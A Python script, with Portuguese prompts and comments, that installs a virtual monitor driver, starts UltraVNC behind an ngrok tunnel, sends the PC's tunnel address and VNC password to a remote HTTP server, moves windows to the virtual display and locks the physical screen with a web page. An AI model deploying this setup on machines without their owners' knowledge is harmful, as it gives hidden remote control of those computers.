import subprocess, socket, time, sys, os, platform
from pwdgen import gerarPassword
from threading import Thread
from webviewLock import builderWebView
sys.path.append('../httpC/')
from httpClient import HTTP
from ngrok import builder, getTunnels
from windowsManager import moveAll



class VNC():
    
    def __init__(self):
        self.__vncServerPath = os.path.dirname(os.path.abspath(__file__)) + "/UltraVNC"
        self.__usbmmiddPath = os.path.dirname(os.path.abspath(__file__)) + "/usbmmidd/"
        self.__displayPath = os.path.dirname(os.path.abspath(__file__))+ "/DisplaySwitch.exe"

        self.desktopName = str(input("Identifique esse PC com um nome: "))
        self.htmlURL = str(input("URL da tela de bloqueio: "))
        self.loginPWD = gerarPassword()
        self.viewPWD = gerarPassword()

        self.h = HTTP()

        self.bits = self.getArch()
        self.device = self.selectDevice(self.bits)

    def runOnCmd(self, cmd):
        output = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
        output = output.communicate()[0].decode('utf-8')
        return output
        

    def testServer(self):
        #print(f'verificando o server...')
        
        pass

    def rodarServer(self):
        #print(f'Rodando o server!')
        
        startServerCMD = ["cd", self.__vncServerPath, "&", "winvnc"]
        
        Thread(target=self.runOnCmd, args=[startServerCMD]).start()
        time.sleep(5)    
        
        
        print("[+] Server UP")


    def pararServer(self):
        #print(f'Derrubando qualquer instacia de VNC!')

        stopServerCMD = ["cd", self.__vncServerPath, "&", "winvnc", "-kill"]
        self.runOnCmd(stopServerCMD)



    def setPWD(self):
        

        #print(f'configurando password: {loginPWD}')
        
        setPwdCMD = ["cd", self.__vncServerPath, "&", "setpasswd.exe", f'{self.loginPWD}', f'{self.viewPWD}']

        self.runOnCmd(setPwdCMD)


    def lockScreen(self, url):
        builderWebView(url)

    def verificarSeCriouMonitor(self):
        cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'status', 'usbmmidd']
        output = self.runOnCmd(cmd)
        if 'Driver is running' in output:
            #print('monitor criado com sucesso!')
            return True
        else:
            #print('Monitor não foi criado!')
            return False
            
    def getArch(self):
        try:
            arch = platform.processor()
            if '32' in arch:
                bits = 32
                return bits
            else:
                bits = 64
                return bits
        except Exception as e:
            print(f'Ocorreu um erro: {e}')


    def selectDevice(self, bits):
        if bits == 32:
            return 'deviceinstaller'
        else:
            return 'deviceinstaller64'

    def criar2Monitor(self):

        try:
            cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'status', 'usbmmidd']

            output= self.runOnCmd(cmd)
            if 'No matching devices found.' in output:
                cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'install' , 'usbmmidd.inf', 'usbmmidd']
                output = self.runOnCmd(cmd)
                if self.verificarSeCriouMonitor():
                    #print('ativando monitor')
                    cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'enableidd' , '1']
                    self.runOnCmd(cmd)
            else:
                #print('Monitor virtual já existe!\nAtivando monitor\nMonitor Ativado!')
                cmd = ["cd", self.__usbmmiddPath, "&", self.device, 'enableidd' , '1']
                self.runOnCmd(cmd)

        except Exception as e:
            print(f'Ocorreu um erro {e}')

    def setMonitorMode(self):
        
        if self.verificarSeCriouMonitor():
            cmd = [self.__displayPath, '/extend']
        else:
            cmd = [self.__displayPath, '/internal']
        self.runOnCmd(cmd)



    def postPC(self):
        ip = builder()
        data = {
            "pcName": self.desktopName,
            "ip": ip[6:],
            "htmlURL": self.htmlURL,
            "password": self.loginPWD,
            "isLocked": True
        }

        self.h.postPC(data)


    def builder(self):
        try:
            print("Estamos acertando as coisas para voce!\nIsso pode demorar um pouquinho")
            self.postPC()
            self.criar2Monitor()
            self.setPWD()
            self.pararServer()
            Thread(target=self.setMonitorMode()).start()
            self.rodarServer()
            Thread(target=moveAll()).start()
            self.lockScreen(self.htmlURL)
            print("application end")
        except KeyboardInterrupt:
            print('Interrupted')
            try:
                sys.exit(0)
            except SystemExit:
                os._exit(0)

if __name__ == '__main__':
    v = VNC()
    v.builder()
